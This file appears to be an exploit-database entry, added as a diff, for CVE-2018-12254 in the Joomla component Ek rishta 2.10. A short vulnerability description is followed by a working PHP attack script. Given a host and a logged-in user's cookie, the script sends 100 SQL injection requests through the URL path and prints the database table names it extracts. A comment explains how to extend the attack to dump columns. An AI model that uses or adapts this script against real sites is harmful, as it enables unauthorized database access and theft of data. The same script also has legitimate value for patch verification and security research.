@@ -1,0 +1,54 @@
+# Title: SQL Injection Joomla Component Ek rishta 2.10 - SQL Injection
+# Date: 2018-06-14
+# Exploit Author: Guilherme Assmann
+# Vendor Homepage:https://www.joomla.org/
+# Version: 2.10
+# Tested on: MacOSX, Safari, Chrome
+# Download: https://extensions.joomla.org/extension/ek-rishta/
+# CVE: CVE-2018-12254
+
+# Vulnerability Description
+# To exploit this vulnerability, the user must be logged on to the platform!
+# the vulnerability allows SQL Injection via the
+# PATH_INFO to a home/requested_user/Sent%20interest/[username] URI.
+# more information(en): 
+# https://fireshellsecurity.team/cve-2018-12254-sql-injection-joomla-component/
+# more information(pt-br): https://m4k4br0.github.io/sql-injection-joomla-component/
+# more information: https://desecsecurity.com/
+# exploit code to dump tables:
+
+<?php
+
+// CVE-2018-12254
+
+// after dump the tables, use %60%23table_name%60 to dump columns...
+
+$host = $argv[1];
+$cookie = $argv[2];
+
+// Usage: php exploit.php [http://[HOST]/](http://[host]/) “Cookie: foo=bar”
+function exploit($host,$ck){
+$urls = sqli();
+$ch = curl_init();
+foreach($urls as $url){
+curl_setopt($ch,CURLOPT_URL,$host.$url);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch,CURLOPT_USERAGENT,":)");
+curl_setopt($ch,CURLOPT_HTTPHEADER, [$ck]);
+curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,100);
+curl_setopt($ch,CURLOPT_TIMEOUT,100);
+$response = curl_exec($ch);
+$s =  strpos($response,"#__");
+echo substr($response,$s,30)."\n";
+}
+}
+function sqli(){
+$uri = "/index.php/home/requested_user/Sent%20interest/1'or%20";
+for($i=0;$i<100;$i++){
+$value = $i+1;
+$data[$i] = $uri.str_replace("+","%20",urlencode('extractvalue(0xa,concat(0xa,(select table_name from information_schema.tables where table_schema=database() limit '.$value.',1))) #'));
+}
+return $data;
+}
+exploit($host,$cookie);
+?>
